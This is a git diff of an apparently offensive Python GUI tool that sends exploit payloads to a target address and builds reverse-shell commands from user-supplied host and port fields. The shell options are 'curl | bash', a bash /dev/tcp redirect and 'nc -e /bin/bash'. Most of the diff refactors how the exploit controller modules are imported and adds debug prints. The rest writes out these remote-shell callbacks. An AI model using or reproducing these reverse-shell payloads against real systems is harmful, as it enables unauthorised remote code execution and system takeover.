@@ -431,10 +431,6 @@ class MainWindow(QMainWindow, QObject):
 
 
         payload = self.ui.payloadCombo.currentText()
-        # module = 'rocCheckPayload.{}'.format(payload)
-        # importModule = importlib.import_module(module)
-        # data = importModule.run.runCheck(self, targetAddr, payload)
-        # self.textEditinfo.emit('{}'.format(data['data']))
         module = 'controller.rocCheckController'
         importModule = importlib.import_module(module)
         data = importModule.rocCheckController.runCheck(self, targetAddr, payload)
@@ -472,21 +468,23 @@ class MainWindow(QMainWindow, QObject):
         targetAddr = self.ui.targetlineEdit.text()
         payload = self.ui.payloadCombo.currentText() # 获取payload编号
         lhost = self.ui.lipaddrlineEdit.text()
+        print(lhost)
         lport = self.ui.lport.text()
+        print(lport)
         rebound = self.ui.reboundCombo.currentText()
 
-        if rebound == 'curl ip:port':
+        if rebound == 'curl ip:port | bash':
             reboundData = r'curl {}:{} | bash'.format(lhost, lport)
         elif rebound == '/bin/bash -i >& /dev/tcp/ip/port 0>&1':
-            reboundData = r'/bin/bash+-i>%26+/dev/tcp/{}/{}+0>%261'.format(lhost, lport)
+            reboundData = r'/bin/bash -i > /dev/tcp/{}/{} 0<&1 2>&1'.format(lhost, lport)
         elif rebound == 'nc ip port -e /bin/bash':
             reboundData = r'nc {} {} -e /bin/bash'.format(lhost, lport)
         else:
             return '操作错误'
 
-        module = 'rocRebound.{}'.format(payload)
+        module = 'controller.rocReboundController'
         importModule = importlib.import_module(module)
-        data = importModule.run.runRebound(self, targetAddr, payload,reboundData)
+        data = importModule.rocReboundController.runRebound(self, targetAddr,payload,reboundData)
         self.textEditinfo.emit('{}'.format(data['data']))
 
     def uploadfile(self):
